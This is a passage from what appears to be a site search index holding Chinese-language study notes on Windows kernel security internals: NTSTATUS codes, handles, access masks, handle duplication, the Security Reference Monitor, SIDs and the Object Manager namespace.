\u8fd4\u56de\u5230NtCreateMutant\u7684\u7b2c\u56db\u4e2a\u53c2\u6570InitialOwner\uff0c\u5728\u8fd9\u91cc\u7528\u4e8e\u6307\u5b9a\u521b\u9020\u7684\u5bf9\u8c61\uff08\u8fd9\u4e2a\u51fd\u6570\u521b\u9020\u7684\u5bf9\u8c61\u662fMutant\uff0c\u4e00\u4e2a\u548c\u7ebf\u7a0b\u540c\u6b65\u6709\u5173\u7684\u5bf9\u8c61\uff09\u662f\u5426\u5f52\u5c5e\u4e8e\u6267\u884c\u7cfb\u7edf\u8c03\u7528\u7684\u7528\u6237\u3002\u8fd9\u91cc\u53ef\u4ee5\u8bbe\u7f6e\u6709\u5f88\u591a\u590d\u6742\u7684\u53c2\u6570\uff0c\u5728\u540e\u6587\u8ba8\u8bba\u3002 NTSTATUS Codes \u6240\u6709\u7cfb\u7edf\u8c03\u7528\u90fd\u4f1a\u8fd4\u56de\u4e00\u4e2a32bit\u7684NTSTATUS code\uff0c\u7ed3\u6784\u5982\u4e0b \u5728NTSTATUS code 30\u548c31\u4f4dbit\u7684\u503c\u7528\u4e8e\u8868\u793a\u8fd9\u4e2a\u7cfb\u7edf\u8c03\u7528\u7684\u6267\u884c\u72b6\u6001\uff08\u662f\u5426\u6210\u529f\u6216\u8005\u6267\u884c\u9519\u8bef\u7b49\uff09 \u5982\u679c\u4e25\u91cd\u6027\u662f\u8b66\u544a\u6216\u9519\u8bef\uff0c\u90a3\u4e48\u72b6\u6001\u7801\u7684\u7b2c31\u4f4d\u5c06\u88ab\u8bbe\u7f6e\u4e3a1\u3002\u5982\u679c\u5c06\u72b6\u6001\u7801\u89c6\u4e3a\u6709\u7b26\u53f7\u768432\u4f4d\u6574\u6570\uff0c\u90a3\u4e48\u8fd9\u4e2a\u4f4d\u8868\u793a\u4e00\u4e2a\u8d1f\u503c\u3002\u901a\u5e38\u7684\u7f16\u7801\u60ef\u4f8b\u662f\u5047\u8bbe\uff0c\u5982\u679c\u72b6\u6001\u7801\u662f\u8d1f\u6570\uff0c\u90a3\u4e48\u8be5\u4ee3\u7801\u8868\u793a\u4e00\u4e2a\u9519\u8bef\uff0c\u5982\u679c\u662f\u6b63\u6570\uff0c\u90a3\u4e48\u8868\u793a\u6210\u529f\u3002\u4ece\u8868\u4e2d\u53ef\u4ee5\u770b\u51fa\uff0c\u8fd9\u4e2a\u5047\u8bbe\u5e76\u4e0d\u5b8c\u5168\u6b63\u786e\uff0c\u56e0\u4e3a\u8d1f\u7684\u72b6\u6001\u7801\u4e5f\u53ef\u4ee5\u662f\u4e00\u4e2a\u8b66\u544a\uff0c\u4f46\u5728\u5b9e\u8df5\u4e2d\u5b83\u8db3\u591f\u6709\u6548\u3002 29\u6bd4\u7279\u4f4d\u7684CC\u7528\u4e8e\u8868\u793a\u72b6\u6001\u7801\u662f\u5426\u7531Microsoft\u5b9a\u4e49\uff08\u503c\u4e3a0\uff09\u8fd8\u662f\u7531\u7b2c\u4e09\u65b9\u5b9a\u4e49\uff08\u503c\u4e3a1\uff09\u3002\u4f46\u5176\u5b9e\u7b2c\u4e09\u65b9\u6ca1\u5fc5\u8981\u9075\u5b88\u8fd9\u4e2a\u89c4\u8303\u3002 28\u4f4d\u7684R\u662f\u4e00\u4e2a\u56fa\u5b9a\u503c0. 27-16\u6bd4\u7279\u4f4d\u7684Facility\u7528\u4e8e\u6307\u793a\u4e0e\u72b6\u6001\u7801\u76f8\u5173\u8054\u7684\u7ec4\u4ef6\u6216\u8005\u5b50\u7cfb\u7edf\uff0c\u5fae\u8f6f\u9884\u5b9a\u4e49\u4e86\u5927\u7ea650\u4e2aFacility\u3002\u7b2c\u4e09\u65b9\u5e94\u8be5\u5b9a\u4e49\u81ea\u5df1\u7684Facility\u5e76\u7ed3\u5408\u4ee3\u7801\u4e0e\u5fae\u8f6f\u9884\u5b9a\u4e49\u7684Facility\u533a\u5206\u5f00\u6765\u3002\u5982\u4e0b\u6709\u51e0\u4e2a\u5e38\u89c1Facility 15-0\u6bd4\u7279\u4f4d\u5219\u662f\u7531\u5b9e\u65bd\u8005\u81ea\u5df1\u5b9a\u4e49\u7684\u72b6\u6001\u7801\uff0c\u5982\u4e0b\u8868\u5c55\u793a\u4e00\u6837\u3002 \u5bf9\u8c61\u53e5\u67c4 \u7528\u6237\u5c42\u4e0d\u80fd\u76f4\u63a5\u8bfb\u5199\u5185\u6838\u5c42\u7684\u5185\u5b58\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528\u8fd4\u56de\u7684\u5bf9\u8c61\u53e5\u67c4\u53bb\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002 \u5185\u6838\u4e2d\u6709\u4e00\u4efd\u4e0e\u5982\u4e0b\u4e09\u4e2a\u4fe1\u606f\u76f8\u5173\u8054\u7684\u53e5\u67c4\u8868\uff08handle table\uff09: \u53e5\u67c4\u7684\u6570\u503c\u6807\u8bc6\u7b26\u3002 \u53e5\u67c4\u88ab\u6388\u4e88\u7684\u6743\u9650\uff0c\u4f8b\u5982\u8bfb\u6216\u5199\u3002 \u6307\u5411\u5185\u6838\u5185\u5b58\u4e2d\u5bf9\u8c61\u7ed3\u6784\u7684\u6307\u9488\u3002 \u5728\u5185\u6838\u53ef\u4ee5\u4f7f\u7528\u53e5\u67c4\u4e4b\u524d\uff0c\u7cfb\u7edf\u8c03\u7528\u5b9e\u73b0\u5fc5\u987b\u4f7f\u7528\u8bf8\u5982ObReferenceObjectByHandle\u4e4b\u7c7b\u7684\u5185\u6838API\u4ece\u53e5\u67c4\u8868\u4e2d\u67e5\u627e\u5185\u6838\u5bf9\u8c61\u6307\u9488\u3002\u901a\u8fc7\u95f4\u63a5\u63d0\u4f9b\u53e5\u67c4\uff0c\u5185\u6838\u7ec4\u4ef6\u53ef\u4ee5\u5c06\u53e5\u67c4\u7f16\u53f7\u8fd4\u56de\u7ed9\u7528\u6237\u6a21\u5f0f\u5e94\u7528\u7a0b\u5e8f\uff0c\u800c\u4e0d\u76f4\u63a5\u66b4\u9732\u5185\u6838\u5bf9\u8c61\u3002 \u6587\u5b57\u5f88\u62bd\u8c61\uff0c\u770b\u56fe\uff1a \u5982\u679c\u8bf7\u6c42\u7684\u8bbf\u95ee\u6743\u9650\u4e0e\u53e5\u67c4\u8868\u6761\u76ee\u4e2d\u8bb0\u5f55\u7684\u6388\u4e88\u7684\u8bbf\u95ee\u6743\u9650\u4e0d\u5339\u914d\uff0cAPI\u5c06\u8fd4\u56deSTATUS_ACCESS_DENIED\uff0c\u8f6c\u6362\u64cd\u4f5c\u5c06\u5931\u8d25\u3002\u540c\u6837\uff0c\u5982\u679c\u5bf9\u8c61\u7c7b\u578b\u4e0d\u5339\u914d\uff0cAPI\u5c06\u8fd4\u56deSTATUS_OBJECT_TYPE_MISMATCH\u3002\u8fd9\u4e9b\u6b65\u9aa4\u6709\u52a9\u4e8e\u786e\u4fdd\u53ea\u6709\u7ecf\u8fc7\u6388\u6743\u7684\u7528\u6237\u80fd\u591f\u6267\u884c\u7279\u5b9a\u64cd\u4f5c\u5e76\u8bbf\u95ee\u7279\u5b9a\u7c7b\u578b\u7684\u5bf9\u8c61\u3002 \u8fd9\u4e24\u9879\u68c0\u9a8c\u5bf9\u4e8e\u7cfb\u7edf\u7684\u5b89\u5168\u6765\u8bf4\u662f\u975e\u5e38\u597d\u7684\uff1a \u6743\u9650\u68c0\u6d4b\u9632\u6b62\u7528\u6237\u8d8a\u6743\u8bbf\u95ee \u7c7b\u578b\u68c0\u6d4b\u9632\u6b62\u7528\u6237\u63d0\u4ea4\u63d0\u4ea4\u7c7b\u578b\u4e0d\u76f8\u5e72\u7684\u5185\u6838\u5bf9\u8c61\u9020\u6210\u5185\u6838\u7684\u7c7b\u578b\u6df7\u6dc6\uff0c\u4ece\u800c\u9020\u6210\u5b89\u5168\u5371\u673a\u3002 Access Masks \u53e5\u67c4\u8868\u91cc\u4e00\u4e2a\u53e5\u67c4\u5bf9\u5e94\u7684\u6743\u9650\uff0c\u88ab\u5b58\u50a8\u572832\u6bd4\u7279\u957f\u7684\u7ed3\u6784\u91cc\uff0c\u8fd9\u4e2a\u7ed3\u6784\u53eb\u505aAcessMasks\uff0c\u5b83\u4e5f\u662f\u7cfb\u7edf\u8c03\u7528\u53c2\u6570\u91cc\u7684DesiredAccess\u53c2\u6570\u7684\u7ed3\u6784\u3002 0-15bits\u7684Type Specific Access\uff08\u7c7b\u578b\u7279\u5b9a\u7684\u8bbf\u95ee\u6743\u9650\uff09\u662fAccess Mask\u6700\u91cd\u8981\u7684\u90e8\u5206\uff0c\u7528\u4e8e\u7ed9\u7279\u5b9a\u5185\u6838\u5bf9\u8c61\u7684\u6388\u4e88\u4e13\u5c5e\u7684\u6743\u9650\uff1a \u6bd4\u5982\u4e00\u4e2aFile\u5bf9\u8c61\u4f1a\u6709\u4e13\u5c5e\u7684ReadData\u6216\u8005WriteData\u6743\u9650\u3002 Standard Access\uff08\u6807\u51c6\u8bbf\u95ee\u6743\u9650\uff09\u4e5f\u88ab\u7528\u4e8e\u6388\u4e88\u6743\u9650\uff0c\u4e0d\u8fc7\u5b83\u6388\u4e88\u7684\u6743\u9650\u90fd\u662f\u901a\u7528\u6743\u9650\uff0c\u6807\u51c6\u8bbf\u95ee\u6743\u9650\u7528\u4e8e\u5b9a\u4e49\u8c01\u53ef\u4ee5\u6267\u884c\u8fd9\u4e9b\u901a\u7528\u64cd\u4f5c\uff0c\u4efb\u4f55\u5bf9\u8c61\u90fd\u53ef\u4ee5\u6388\u4e88\u8fd9\u4e9b\u6743\u9650\uff1a Delete \u5220\u9664 ReadControl \u53ef\u4ee5\u8bfb\u53d6\u8be5\u5bf9\u8c61\u7684\u5b89\u5168\u63cf\u8ff0\u7b26 WriteDac \u53ef\u5c06\u5b89\u5168\u63cf\u8ff0\u7b26\u7684\u81ea\u4e3b\u8bbf\u95ee\u63a7\u5236\uff08DAC\uff09\u5199\u5165\u5bf9\u8c61 ..... \u603b\u7684\u6765\u8bf4\uff0c\u6807\u51c6\u8bbf\u95ee\u6743\u9650\u5b9a\u4e49\u4e86\u5bf9\u8c61\u7684\u57fa\u672c\u8bbf\u95ee\u89c4\u5219\uff0c\u800c\u7c7b\u578b\u7279\u5b9a\u7684\u8bbf\u95ee\u6743\u9650\u5219\u5141\u8bb8\u66f4\u7ec6\u7c92\u5ea6\u7684\u3001\u5bf9\u8c61\u7279\u5b9a\u7684\u64cd\u4f5c\u3002 \u968f\u540e\u4fbf\u662f27-21bits\u7684Reversed/Special Access.\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u90fd\u662fReversed\uff08\u4fdd\u7559\uff09\uff0c\u4f46\u4e5f\u53ef\u80fd\u662f\u5982\u4e0b\u4e24\u4e2aSpecial Access AccessSystemSecurity \u8bfb\u5199\u5bf9\u8c61\u7684\u5ba1\u8ba1\u4fe1\u606f\uff08\u7b2c\u516b\u7ae0\u8be6\u7ec6\u8ba8\u8bba\uff09 MaximumAllowed \u5728\u6267\u884c\u8bbf\u95ee\u6743\u9650\u68c0\u67e5\u65f6\u8bf7\u6c42\u5bf9\u8c61\u7684\u6700\u5927\u8bbf\u95ee\u6743\u9650\u3002\uff08\u7b2c\u4e5d\u7ae0\u8be6\u7ec6\u8ba8\u8bba\uff09 \u968f\u540e\u4fbf\u662f28-31bits\u7684generic access\u3002\u5b83\u5141\u8bb8\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u7cfb\u7edf\u8c03\u7528\u7684 DesiredAccess \u53c2\u6570\u8bf7\u6c42\u5bf9\u5185\u6838\u5bf9\u8c61\u7684\u8bbf\u95ee\u6743\u9650\u3002\u901a\u7528\u8bbf\u95ee\u5206\u4e3a\u56db\u4e2a\u5e7f\u6cdb\u7684\u7c7b\u522b\uff0c\u5305\u62ec GenericRead\uff08\u901a\u7528\u8bfb\u53d6\uff09\u3001GenericWrite\uff08\u901a\u7528\u5199\u5165\uff09\u3001GenericExecute\uff08\u901a\u7528\u6267\u884c\uff09\u548cGenericAll\uff08\u901a\u7528\u5168\u90e8\uff09\u3002 \u5177\u4f53\u70b9\u5c31\u662f\uff0c\u5f53\u8bf7\u6c42generic access\u4e2d\u4efb\u610f\u4e00\u4e2a\u6743\u9650\u65f6\uff0cSRM\u4f1a\u81ea\u52a8\u628a\u8fd9\u4e9b\u6743\u9650\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u7c7b\u578b\u9650\u5b9a\u7684\u6743\u9650\u3002 generic access\u4e0e Type-specific access\u7684\u5bf9\u5e94\u5173\u7cfb\uff0c\u5b58\u50a8\u5728generic mapping table\u91cc \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u547d\u4ee4\u6765\u67e5\u770bFile\u5bf9\u8c61\u7684generic mapping table \u5728\u4e0a\u56fe\u4e2d\u53ef\u4ee5\u770b\u89c1\u6bcf\u4e2a\u6743\u9650\u90fd\u5bf9\u5e94\u7740\u4e00\u4e2a\u6570\u5b57\uff08numeric access mask\uff09\uff0c\u6709\u65f6\u6211\u4eec\u67e5\u770b\u6743\u9650\u53ef\u80fd\u53ea\u770b\u5f97\u5230\u8fd9\u4e2a\u6570\u5b57\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u547d\u4ee4\u6765\u8bb2\u6570\u5b57\u8f6c\u6210\u5bf9\u5e94\u6743\u9650\u540d\uff0c\u6216\u8005\u5bf9\u5e94\u6743\u9650\u540d\u8f6c\u6362\u6210\u5bf9\u5e94\u6570\u5b57 \u5728powershell\u91cc\uff0c\u4e3a\u4e86\u6613\u7528\u6027\uff0cwindows SKD\u5c06\u6743\u9650\u7684\u540d\u5b57\u6539\u4e86\u4e00\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u547d\u4ee4\u6765\u67e5\u770b HANDLE Duplication \u6211\u4eec\u53ef\u4ee5\u7528NtDuplicateObject\u8fd9\u4e2a\u7cfb\u7edf\u8c03\u7528\u6765\u590d\u5236\u53e5\u67c4\u3002 \u6211\u4eec\u8fd9\u6837\u505a\u6709\u4e00\u4e2a\u76ee\u7684\u5c31\u662f\u9632\u6b62\u5185\u6838\u5bf9\u8c61\u88ab\u9500\u6bc1\u2014\u2014\u4e00\u4e2a\u5185\u6838\u5bf9\u8c61\u53ea\u6709\u5f53\u6240\u6709\u53e5\u67c4\u90fd\u5173\u95ed\u540e\u624d\u4f1a\u88ab\u9500\u6bc1\u3002 \u8fd8\u53ef\u4ee5\u7528\u4e8e\u53e5\u67c4\u5728\u4e0d\u540c\u7684\u8fdb\u7a0b\u95f4\u4f20\u8f93\uff08\u5728\u6e90\u8fdb\u7a0b\u548c\u76ee\u6807\u8fdb\u7a0b\u90fd\u6709DupHandle\u7684\u6743\u9650\u7684\u524d\u63d0\u4e0b\uff09 \u540c\u65f6\u590d\u5236\u65b0\u53e5\u67c4\u65f6\u53ef\u4ee5\u51cf\u5c11\u65b0\u53e5\u67c4\u7684\u6743\u9650\uff0c\u4ece\u800c\u6765\u5b9e\u73b0\u5b89\u5168\u6027\u3002 \u540c\u65f6\uff0c\u4e00\u4e2a\u53e5\u67c4\u6709\u4e24\u4e2a\u7279\u522b\u7684\u5c5e\u6027\uff1aInherit\uff08\u7ee7\u627f\uff09\u548cProtectFromClose\uff1a Inherit\u5c5e\u6027\u53ef\u4ee5\u8ba9\u4e00\u4e2a\u65b0\u8fdb\u7a0b\u5728\u88ab\u521b\u5efa\u65f6\u7ee7\u627f\u7ee7\u627f\u8be5\u53e5\u67c4\u3002\u53e5\u67c4\u7ee7\u627f\u662f\u4e00\u79cd\u5141\u8bb8\u5b50\u8fdb\u7a0b\u7ee7\u627f\u7236\u8fdb\u7a0b\u7684\u53e5\u67c4\u7684\u673a\u5236\uff0c\u4ece\u800c\u4f7f\u5f97\u5b50\u8fdb\u7a0b\u53ef\u4ee5\u7ee7\u7eed\u4f7f\u7528\u7236\u8fdb\u7a0b\u7684\u8d44\u6e90\uff0c\u5982\u6587\u4ef6\u53e5\u67c4\u3001\u5957\u63a5\u5b57\u7b49\uff0c\u4ee5\u6267\u884c\u76f8\u5173\u4efb\u52a1\u3002 ProtectFromClose\u5219\u662f\u9632\u6b62\u53e5\u67c4\u88ab\u5173\u95ed\uff0c\u4efb\u4f55\u4f01\u56fe\u5173\u95ed\u6b64\u53e5\u67c4\u7684\u64cd\u4f5c\u90fd\u4f1a\u5931\u8d25\u5e76\u8fd4\u56deSTATUS_HANDLE_NOT_CLOSEABLE \u72b6\u6001\u7801\u3002","title":"\u7b2c\u4e8c\u7ae0\uff1a\u5185\u6838\u603b\u8ff0"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%8E%9F%E7%90%86%E6%8E%A2%E7%A9%B6/%E8%AF%BBWINDOW%20SECURITY%20INTERNALS%20WIT/%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%9A%E5%86%85%E6%A0%B8%E6%80%BB%E8%BF%B0/%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%9A%E5%86%85%E6%A0%B8%E6%80%BB%E8%BF%B0/#_1","text":"","title":"\u7b2c\u4e8c\u7ae0\uff1a\u5185\u6838\u603b\u8ff0"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%8E%9F%E7%90%86%E6%8E%A2%E7%A9%B6/%E8%AF%BBWINDOW%20SECURITY%20INTERNALS%20WIT/%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%9A%E5%86%85%E6%A0%B8%E6%80%BB%E8%BF%B0/%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%9A%E5%86%85%E6%A0%B8%E6%80%BB%E8%BF%B0/#_2","text":"\u5b50\u7cfb\u7edf Security Reference Monitor(SRM) Object Manager \u7cfb\u7edf\u8c03\u7528 System Call\u7cfb\u7edf\u8c03\u7528 NTSTATUS Codes \u5bf9\u8c61\u53e5\u67c4 Access Masks HANDLE Duplication \u8fd9\u90e8\u5206\u6211\u6bd4\u8f83\u611f\u5174\u8da3\uff0c\u6240\u4ee5\u8df3\u8fc7\u7b2c\u4e00\u7ae0\u6765\u8bfb\u3002 windows\u5185\u6838(NTOS Kernel Executive)\u7531\u4ee5\u4e0b\u90e8\u5206\u7ec4\u6210\uff0c\u53ef\u89c1\u6709\u7740\u8bb8\u591a\u5b50\u7cfb\u7edf\uff1a \u5728API\u8c03\u7528\u4e2d\uff0cAPI\u7684\u524d\u7f00\u4e5f\u5bf9\u5e94\u7740\u5185\u6838\u4e2d\u4e0d\u540c\u5b50\u7cfb\u7edf\uff0c\u8fd9\u4e00\u70b9\u53ef\u4ee5\u5f88\u597d\u7684\u8bc6\u522bAPI\u7684\u4f5c\u7528\u4f5c\u7528\u8303\u56f4","title":"\u76ee\u5f55"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%8E%9F%E7%90%86%E6%8E%A2%E7%A9%B6/%E8%AF%BBWINDOW%20SECURITY%20INTERNALS%20WIT/%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%9A%E5%86%85%E6%A0%B8%E6%80%BB%E8%BF%B0/%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%9A%E5%86%85%E6%A0%B8%E6%80%BB%E8%BF%B0/#_3","text":"","title":"\u5b50\u7cfb\u7edf"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%8E%9F%E7%90%86%E6%8E%A2%E7%A9%B6/%E8%AF%BBWINDOW%20SECURITY%20INTERNALS%20WIT/%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%9A%E5%86%85%E6%A0%B8%E6%80%BB%E8%BF%B0/%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%9A%E5%86%85%E6%A0%B8%E6%80%BB%E8%BF%B0/#security-reference-monitorsrm","text":"https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/windows-kernel-mode-security-reference-monitor \u5bf9\u4e8e\u5b89\u5168\u4eba\u5458\u6765\u8bf4\u5e94\u8be5\u662f\u6700\u91cd\u8981\u7684\u5b50\u7cfb\u7edf\uff0c\u5b83\u638c\u63a7\u7740\u7528\u6237\u6743\u9650\u7b49\u4e0e\u5b89\u5168\u76f8\u5173\u7684\u4e1c\u897f\u3002 access token SRM \u901a\u8fc7\u5411\u7cfb\u7edf\u4e0a\u8fd0\u884c\u7684\u6bcf\u4e2a\u8fdb\u7a0b\u5206\u914d\u8bbf\u95ee\u4ee4\u724c\u6765\uff08access token\uff09\u5b9a\u4e49\u7528\u6237\u7684\u8eab\u4efd\u3002 \u901a\u8fc7access token\uff0cSRM\u53ef\u4ee5\u5b9e\u65bd\u8bbf\u95ee\u68c0\u67e5\uff08access check\uff09\uff1a \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u5f53\u4e00\u4e2a\u7528\u6237\u8fdb\u7a0b\u60f3\u8981\u8bbf\u95ee\u4e00\u4e2a\u8d44\u6e90\uff08Resource\uff0c\u6bd4\u5982\u8bf4\u60f3\u8981\u8bbf\u95ee\u4e00\u4e2a\u6587\u4ef6\uff09\u65f6\uff0cSRM\u4f1a\u83b7\u53d6\u8d44\u6e90\u7684\u5b89\u5168\u63cf\u8ff0\u7b26\uff08security descriptor\uff09\uff0c\u7136\u540e\u4e0e\u7528\u6237\u8fdb\u7a0b\u7684access token\u8fdb\u884c\u6bd4\u5bf9\uff0c\u8ba1\u7b97access token\u7684\u8bbf\u95ee\u7b49\u7ea7\uff0c\u6216\u8005\u76f4\u63a5\u8fd4\u56de\u7981\u6b62\u8bbf\u95ee\uff0c\u4ece\u800c\u8fbe\u5230\u8d44\u6e90\u7684\u8bbf\u95ee\u7ea7\u522b\u63a7\u5236\u7684\u76ee\u7684\u3002 \u540c\u65f6SRM\u4e5f\u6709\u5ba1\u8ba1\u529f\u80fd\uff0c\u7ba1\u7406\u5458\u53ef\u4ee5\u770b\u5230\u54ea\u4e2a\u7528\u6237\u8bbf\u95ee\u4e86\u54ea\u4e2a\u8d44\u6e90\uff0c\u901a\u8fc7\u8fd9\u4e00\u70b9\u53ef\u4ee5\u6709\u6548\u5730\u8fdb\u884c\u6076\u610f\u8f6f\u4ef6\u7684\u6392\u67e5\u548c\u5b89\u5168\u914d\u7f6e\u9519\u8bef\u7684\u8bca\u65ad\u3002 SID \u7528\u6237\u548c\u7528\u6237\u7ec4\u7684\u4e8c\u8fdb\u5236\u7ed3\u6784\uff0csecurity identifiers (SIDs\uff09\u3002 \u7528\u6237\u548c\u7528\u6237\u540d\u5728SRM\u80fd\u591f\u4f7f\u7528\u524d\uff0c\u4f1a\u901a\u8fc7 Local Security Authority Subsystem\uff08\u672c\u5730\u5b89\u5168\u6743\u5a01\u5b50\u7cfb\u7edf\uff0cLSASS\uff09\u6765\u8f6c\u6362\u4e3aSID\uff0c\u4ee5\u4f9bSRM\u4f7f\u7528\u3002 \u5fae\u8f6f\u5b9a\u4e49\u4e86Security Descriptor Definition Language(SDDL) \u6765\u5c06SID\u4ee5\u5b57\u7b26\u4e32\u7684\u65b9\u5f0f\u5c55\u793a\uff1a\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u7684\u901a\u8fc7powershell\u7684get-ntsid\u51fd\u6570\u83b7\u53d6\u4e00\u4e2a\u7528\u6237\u6216\u7528\u6237\u7ec4\u7684SID\u5b57\u7b26\u4e32\u3002 \u4e00\u4e2aSID\u5b57\u7b26\u4e32\u5927\u6982\u957f\u8fd9\u6837\uff1a S-1-5-21-330569006-3445065962-2600463357-500\u3002 \u7b2c\u4e00\u9879S\u8868\u793a\u8be5\u5b57\u7b26\u4e32\u662fSID\uff1b\u7b2c\u4e8c\u9879\u662fSID\u7684\u7248\u672c\u53f7\uff0c\u56fa\u5b9a\u4e3a1\uff1b\u7136\u540e\u662f\u6807\u5fd7\u7b26\u7684\u9881\u53d1\u673a\u6784\uff08identifier authority\uff09\uff0c\u9881\u53d1\u673a\u6784\u5c31\u662fNT\uff0c\u503c\u662f5\u3002\u7136\u540e\u8868\u793a\u4e00\u7cfb\u5217\u7684\u5b50\u9881\u53d1\u673a\u6784\uff0c\u524d\u9762\u51e0\u9879\u662f\u6807\u5fd7\u57df\u7684\uff0c\u6700\u540e\u4e00\u4e2a\u6807\u5fd7\u7740\u57df\u5185\u7684\u5e10\u6237\u548c\u7ec4\u3002","title":"Security Reference Monitor(SRM)"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%8E%9F%E7%90%86%E6%8E%A2%E7%A9%B6/%E8%AF%BBWINDOW%20SECURITY%20INTERNALS%20WIT/%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%9A%E5%86%85%E6%A0%B8%E6%80%BB%E8%BF%B0/%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%9A%E5%86%85%E6%A0%B8%E6%80%BB%E8%BF%B0/#object-manager","text":"https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/windows-kernel-mode-object-manager \u5728linux\u91cc\uff0c\u6240\u6709\u4e1c\u897f\u90fd\u662f\u6587\u4ef6\uff1b\u800c\u5728windows\u91cc\uff0c\u6240\u6709\u4e1c\u897f\u90fd\u662f\u5bf9\u8c61\uff08\u6587\u4ef6\u3001\u8bbe\u5907\u3001\u540c\u6b65\u673a\u5236\u3001\u6ce8\u518c\u8868\u9879\u7b49\u7b49\u7b49\u7b49\uff09\uff0c\u5728\u5185\u6838\u91cc\u90fd\u662f\u4ee5\u5bf9\u8c61\u7ed3\u6784\u5b58\u5728\u3002 Object Manager\u5c31\u662fwindows\u91cc\u7ba1\u6240\u6709\u8d44\u6e90\u7684\u5b50\u7cfb\u7edf\u3002 ** Object Type \u5bf9\u8c61\u7c7b\u578b** windows\u5185\u6838\u7ef4\u62a4\u7740\u4e00\u4efd\u8bb0\u5f55\u6240\u652f\u6301\u5bf9\u8c61\u7684\u7c7b\u578b\u7684\u6e05\u5355\u3002 \u8fd9\u91cc\u7a0d\u5fae\u5217\u51e0\u4e2a Files Devices Threads Processes Events Mutexes Semaphores Registry keys Jobs Sections Access tokens Symbolic links Object Manager NameSpace\uff08OMNS\uff09 windows \u5185\u6838\u4e2d\u6709\u4e00\u5957\u989d\u5916\u7684\u6587\u4ef6\u7cfb\u7edf\uff0c\u5373 Object Manager Namespace\u3002\u5b98\u65b9\u5bf9\u5b83\u62ab\u9732\u4e0d\u591a\u3002 OMNS\u57fa\u4e8eDirectory \u5bf9\u8c61\u5efa\u7acb\uff0c\u5b83\u770b\u4e0a\u53bb\u548c\u666e\u901a\u7528\u6237\u6240\u80fd\u63a5\u89e6\u5230\u7684\u6587\u4ef6\u7cfb\u7edf\uff08\u5c31\u50cfexplore\u6253\u5f00\u7684\u4e00\u6837\uff09\u5dee\u4e0d\u591a\uff0c\u5c31\u50cf\u4e0b\u56fe\u4e00\u6837 \u5728OMNS\u4e2d\u6709\u51e0\u4e2a\u5e7f\u4e3a\u4eba\u77e5\u7684\u76ee\u5f55\uff0c\u5982\u4e0b\u56fe \u5176\u4e2dBaseNamedObjects\u76ee\u5f55\uff08BNO\uff09\u53ef\u4ee5\u5141\u8bb8\u4efb\u4f55\u7528\u6237\u521b\u9020\u6709\u540d\u5b57\u7684\u5185\u6838\u5bf9\u8c61\uff08\u6ce8\u610f\u7684\u662f\u5728BNO\u76ee\u5f55\u521b\u5efa\u5bf9\u8c61\u5e76\u4e0d\u662f\u5fc5\u987b\u7684\uff0c\u5b83\u53ea\u662f\u4e00\u4e2a\u4e60\u4fd7\uff09\uff0c\u5b83\u5141\u8bb8\u4e00\u4e2a\u7cfb\u7edf\u4e0a\u7684\u4e24\u4e2a\u7528\u6237\u5171\u4eab\u8d44\u6e90\u3002","title":"Object Manager"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%8E%9F%E7%90%86%E6%8E%A2%E7%A9%B6/%E8%AF%BBWINDOW%20SECURITY%20INTERNALS%20WIT/%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%9A%E5%86%85%E6%A0%B8%E6%80%BB%E8%BF%B0/%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%9A%E5%86%85%E6%A0%B8%E6%80%BB%E8%BF%B0/#_4","text":"","title":"\u7cfb\u7edf\u8c03\u7528"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%8E%9F%E7%90%86%E6%8E%A2%E7%A9%B6/%E8%AF%BBWINDOW%20SECURITY%20INTERNALS%20WIT/%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%9A%E5%86%85%E6%A0%B8%E6%80%BB%E8%BF%B0/%E7%AC%AC%E4%BA%8C%E7%AB%A0%EF%BC%9A%E5%86%85%E6%A0%B8%E6%80%BB%E8%BF%B0/#system-call","text":"\u7528\u6237\u6001\u5e94\u7528\u53ef\u4ee5\u901a\u8fc7SystemCall\u53bb\u8bbf\u95eeOMNS\u91cc\u7684\u5bf9\u8c61\uff1a\u5728\u7528\u6237\u5c42\u8c03\u7528SystemCall\u63a5\u53e3\u8c03\u7528\u5185\u6838\u5c42\u4ee3\u7801\u53bb\u8b